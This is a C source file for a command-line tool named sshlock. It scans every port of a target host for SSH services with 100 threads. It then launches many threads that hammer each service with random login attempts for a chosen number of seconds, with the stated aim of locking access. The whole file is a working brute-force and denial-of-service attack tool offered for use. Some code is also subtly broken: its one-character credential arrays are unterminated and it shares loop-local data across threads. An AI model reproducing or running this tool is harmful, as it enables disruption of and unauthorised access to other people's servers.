/*
    * sshlock.c

    * This method is a ssh lock method. The ssh method scans the targets all ports to find active ssh ports and locks access to them by multithreaded brute force attack.
*/

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <pthread.h>
#include <libssh/libssh.h>
#include <libssh/server.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <sys/select.h>
#include <fcntl.h>
#include <time.h>

const char charset[] = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";

struct Credentials {
    char username[1];
    char password[1];
};

struct Arguments {
    char *target;
    int port;
    int seconds;
};

struct ScanArgs {
    char *target;
    int *active_ports;
    int start_port;
    int end_port;
};

struct Credentials GenerateRandomCredentials() {
    struct Credentials credentials;
    for (int i = 0; i < 1; i++) {
        credentials.username[i] = charset[rand() % strlen(charset)];
        credentials.password[i] = charset[rand() % strlen(charset)];
    }
    return credentials;
}

void SshLock(void *args) {
    struct Arguments *arguments = (struct Arguments *)args;
    time_t start = time(NULL);
    while (time(NULL) - start < arguments->seconds) {
        struct Credentials credentials = GenerateRandomCredentials();
        ssh_session session = ssh_new();
        if (session == NULL) {
            exit(-1);
        }
        ssh_options_set(session, SSH_OPTIONS_HOST, arguments->target);
        ssh_options_set(session, SSH_OPTIONS_PORT, &arguments->port);
        if (ssh_connect(session) != SSH_OK) {
            ssh_free(session);
            continue;
        }
        ssh_userauth_password(session, credentials.username, credentials.password);
        ssh_disconnect(session);
        ssh_free(session);
    }
    pthread_exit(NULL);
}

void *PortScan(void *args) {
    struct ScanArgs *scan_args = (struct ScanArgs *)args;
    char buffer[256];
    struct sockaddr_in server_addr;
    int sock;
    fd_set set;
    struct timeval timeout;

    server_addr.sin_family = AF_INET;
    server_addr.sin_addr.s_addr = inet_addr(scan_args->target);

    for (int port = scan_args->start_port; port < scan_args->end_port; port++) {
        server_addr.sin_port = htons(port);
        sock = socket(AF_INET, SOCK_STREAM, 0);
        
        fcntl(sock, F_SETFL, O_NONBLOCK);

        connect(sock, (struct sockaddr*)&server_addr, sizeof(server_addr));

        FD_ZERO(&set);
        FD_SET(sock, &set);
        timeout.tv_sec = 0;
        timeout.tv_usec = 300000;
        if (select(sock + 1, NULL, &set, NULL, &timeout) > 0) {
            fcntl(sock, F_SETFL, fcntl(sock, F_GETFL, 0) & ~O_NONBLOCK);
            memset(buffer, 0, sizeof(buffer));
            read(sock, buffer, sizeof(buffer) - 1);
            if (strstr(buffer, "SSH-") != NULL) {
                scan_args->active_ports[port] = 1;
            }
        }
        close(sock);
    }
    return NULL;
}

int *SshScan(char *target) {
    const int num_threads = 100;
    int *active_ports  = calloc(65536, sizeof(int));
    pthread_t *threads = malloc(num_threads * sizeof(pthread_t));
    struct ScanArgs *scan_args = malloc(num_threads * sizeof(struct ScanArgs));

    int ports_per_thread = 65536 / num_threads;
    for (int i = 0; i < num_threads; i++) {
        scan_args[i].target = target;
        scan_args[i].active_ports = active_ports;
        scan_args[i].start_port = i * ports_per_thread;
        scan_args[i].end_port = (i + 1) * ports_per_thread;
        if (i == num_threads - 1) {
            scan_args[i].end_port = 65536;
        }
        pthread_create(&threads[i], NULL, PortScan, &scan_args[i]);
    }

    for (int i = 0; i < num_threads; i++) {
        pthread_join(threads[i], NULL);
    }

    free(threads);
    free(scan_args);
    return active_ports;
}

int main(int argc, char *argv[]) {
    srand(time(NULL));
    if (argc < 4) {
        printf("Usage: %s <target> <seconds> <threads> <port:optional|(If not set we will scan all ports)>\n", argv[0]);
        exit(-1);
    }

    char *target = argv[1];
    int seconds  = atoi(argv[2]);
    int threads  = atoi(argv[3]);
    int port     = argc == 5 ? atoi(argv[4]) : 0;

    printf("Target:  %s\n", target);
    printf("Seconds: %d\n", seconds);
    printf("Threads: %d\n", threads);
    printf(port ? "Port: %d\n" : "Port: All\n", port);

    pthread_t *mthreads = NULL;
    int thread_count = 0;

    if (port) {
        struct Arguments arguments = {target, port, seconds};
        mthreads = malloc(threads * sizeof(pthread_t));
        for (int i = 0; i < threads; i++) {
            pthread_create(&mthreads[i], NULL, (void *)SshLock, (void *)&arguments);
            thread_count++;
            printf("\r[+] Total Threads Created: %d", thread_count);
            fflush(stdout);
            usleep(10000);
        }
    } else {
        int *active_ports = SshScan(target);
        for (int i = 0; i < 65536; i++) {
            if (active_ports[i] == 1) {
                printf("[+] Thread Created for Port: %d\n", i);
                struct Arguments arguments = {target, i, seconds};
                mthreads = realloc(mthreads, (thread_count + threads) * sizeof(pthread_t));
                for (int j = 0; j < threads; j++) {
                    pthread_create(&mthreads[thread_count + j], NULL, (void *)SshLock, (void *)&arguments);
                }
                thread_count += threads;
                printf("\r[+] Total Threads Created: %d", thread_count);
                fflush(stdout);
                usleep(10000);
            }
        }
    }

    for (int i = 0; i < thread_count; i++) {
        pthread_join(mthreads[i], NULL);
    }

    printf("\n[+] All threads have finished\n");

    free(mthreads);
    return 0;
}